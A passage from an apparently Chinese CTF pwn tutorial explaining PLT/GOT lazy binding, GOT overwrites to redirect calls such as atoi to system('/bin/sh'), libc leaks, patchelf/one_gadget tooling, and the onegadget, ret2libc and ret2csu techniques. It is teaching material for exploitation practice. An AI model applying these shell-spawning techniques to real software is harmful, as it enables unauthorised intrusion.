gets@PLT：
		jmp GOT[gets]   ;相当于把got表看成一个函数指针数组，跳转到数组中存放的gets的真实地址
		...
```

另外还需要讲解一下延迟绑定机制。程序刚开始运行的时候，自己也是不知道库函数的真实地址的，所以GOT表一开始存放的不是库函数的真实地址，而是一个查找函数的地址。因此第一次调用这个库函数的时候，事实上会先跳转到这个查找函数，找到这个库函数的真实地址，然后再写入GOT表中。以后再调用这个库函数的时候，才会通过GOT表直接跳转到库函数的真实地址。

那么如何利用这些性质呢？

- 首先，不管是第一次还是之后，只要跳转到函数的PLT表地址，一定是可以完成这个函数调用的；而且这个PLT表地址是在可执行文件中的，不需要泄漏libc。
- GOT表是数据段，有时是用户可读写的。因此，如果篡改GOT表，变成我们希望执行的代码地址，那么就能使得程序执行我们希望执行的函数。例如：
    
    ```c
    char a[100];
    gets(a);
    int b=atoi(a);
    ```
    
    上述程序是一个将字符串转换为数字的片段。但如果我们将atoi的got表篡改为system在libc中的实际地址，那么第三行实际上就会变成`int b=system(a);`，此时，我们如果在第二行的输入中输入`'/bin/sh'`，那么就能getshell。同理，我们将atoi的got表篡改成shellcode的地址，有时也可以get shell；
    
    改成onegadget（后面会提到），就能直接getshell；
    
    改成main函数的地址，就能循环执行这个程序，方便我们进行更多的篡改劫持工作；
    
    放开思路，将atoi的got改成某个函数的plt地址，也能完成对这个函数的调用。
    
    不管怎样，只需要将got表改成一个可执行地址，那么就能执行相应的代码。
    
- 对于一个已经调用过一次的库函数，如果我们有办法将其got表项用某种方式打印出来，那么就泄漏了本次运行中这次库函数在libc的真实地址，继而可以计算得到libc基地址，泄露整个libc。注意一定要已经调用过。

## 1.3.2 工具使用

- readelf
    
    这个工具用以列举程序中的符号表，常常用来寻找动态链接库中的函数地址，一般linux自带。
    
    用法：
    
    ```bash
    readelf -s filename.so
    ```
    
    用于列出程序中所有的符号和地址。
    
    常常在后面用管道符和grep来搜索函数：
    
    ```bash
    readelf -s filename.so | grep gets
    ```
    
    寻找结果中带gets的内容。
    
- glibc-all-in-one
    
    这是一个常用的glibc下载工具
    
    ```bash
    git clone https://github.com/matrix1001/glibc-all-in-one.git
    cd glibc-all-in-one
    ./update_list
    ```
    
    上面几步用于安装和更新已经发布的glibc
    
    ```bash
    cat list(或者old_list)
    ```
    
    查看可下载的glibc版本
    
    ```bash
    ./download 2.23-0ubuntu10_amd64
    ```
    
    下载某个版本的glibc。旧版本可以用download_old，下载好的文件存放在libs文件夹中。
    
- patchelf
    
    这个程序用于替换程序运行需要的glibc版本。一般需要替换两个，一个是libc的so文件本身，另一个则是链接程序ld。
    
    ```bash
    patchelf filename --print-needed
    ```
    
    打印程序运行需要的动态库，其中一般包含glibc，显示为libc.so.6
    
    ```bash
    patchelf filename --replace-needed libc.so.6 /path/to/your/glibc/libc.so.6
    ```
    
    将上一步搜索出的条目替换成自己下载的so文件
    
    ```bash
    patchelf filename --set-interpreter /patch/to/your/glibc/ld.so.6
    ```
    
    替换程序使用的ld程序
    
    一般，ld程序和so动态库需要保持版本相同，否则可能导致崩溃。
    
- ldd
    
    linux自带指令，用于查看程序运行需要的动态库的具体位置，常用于验证patchelf是否成功。
    
    ```bash
    ldd filename
    ```
    
- file
    
    linux自带指令，用于查看程序信息，比如位数、大小端、是否静态链接等等。
    
    ```bash
    file filename
    ```
    
- libc.rip
    
    直接在浏览器中访问 [https://libc.rip/](https://libc.rip/).
    
    在线工具，也可以下载后本地搭建。内含存储大量glibc版本的数据库，自带偏移量筛选工具，可以指定一些函数符号最后三位来筛选出符合的版本进行本地搭建。
## 1.3.3 利用思路

这里只讲一些简单的。

一般情况下，我们需要一个大前提，就是知道本次程序运行的libc基地址。只需要我们泄漏得到某个函数的真实地址，结合这个版本的libc本地文件，就能相减得到基地址，从而确定其他库函数的地址。其他就是各种劫持控制流的手段。
### onegadget

最简单的利用方式，在许多版本的glibc中，只需要从代码段的某些地址开始运行，就能一路达成`execve("/bin/sh",0,0)`的效果，但是可能需要满足某些条件，比如最开始栈上某个位置为0等等。这种地址被称作onegadget，可以用onegadget工具指定glibc文件进行搜索。

安装：

```bash
sudo apt -y install ruby
sudo gem install one_gadget
```

使用：

```bash
$ one_gadget libc.so.6
```

效果：

```bash
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1117 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

这时，只要在程序中随便跳转到上面任何一个满足constraints的实际地址，就能触发onegadget。
### ret2libc

计算得到基地址后我们就确定了整个libc库的所有函数本次运行的真实地址。一般最有用的是system函数，它只有一个参数就是文件名。只要运行`system("/bin/sh")`就能在底层调用`execve`，从从而运行shell。我们的工作是将`"/bin/sh"`的地址传进第一个参数里，32位下可能是调整栈布局，而64位则是设置寄存器。

另外，知道libc基地址后，还有很多函数可以用，比如用gets来输入一串文字、mprotect来设置某些空间的读写执行权限等等，劫持控制流后都可以按需求来构造调用。
### ret2csu

这是glibc下一个特殊的方法。在glibc的许多版本中，有一个叫做`__libc_csu_init`的代码段，形式如下：

```c
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp

```

通过段代码中的gadget，我们可以设置很多rop中需要用到的寄存器和64位函数调用传参数用的寄存器并return，以此来配合ret2libc传参数或者直接rop。